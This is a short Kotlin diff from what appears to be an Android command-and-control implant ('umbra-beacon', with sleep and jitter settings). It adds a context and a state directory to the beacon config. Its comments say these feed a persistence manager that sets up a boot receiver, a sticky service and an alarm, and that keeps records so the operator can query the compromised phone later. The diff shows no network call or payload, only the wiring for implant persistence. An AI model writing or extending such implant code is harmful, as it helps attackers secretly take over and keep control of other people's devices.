@@ -51,6 +51,8 @@ class Beacon(
                     agentId = config.agentId,
                     version = config.version,
                     log = { message -> log(message) },
+                    stateDir = config.stateDir,
+                    android = config.androidContext,
                 )
             )
             val t = Thread({ loop() }, "umbra-beacon")
@@ -336,4 +338,19 @@ data class BeaconConfig(
     val sleepSec: Int,
     val jitterPercent: Int,
     val version: String,
+    /**
+     * The Android context of the implant.
+     *
+     * The persistence manager needs it: the boot receiver, the sticky
+     * service and the alarm are all things the package manager knows
+     * about, and only the context can change them.
+     */
+    val androidContext: android.content.Context? = null,
+    /**
+     * Where the implant keeps its own state.
+     *
+     * The persistence entries live there, so the operator can ask the
+     * phone what is installed on it long after the fact.
+     */
+    val stateDir: String = "",
 )
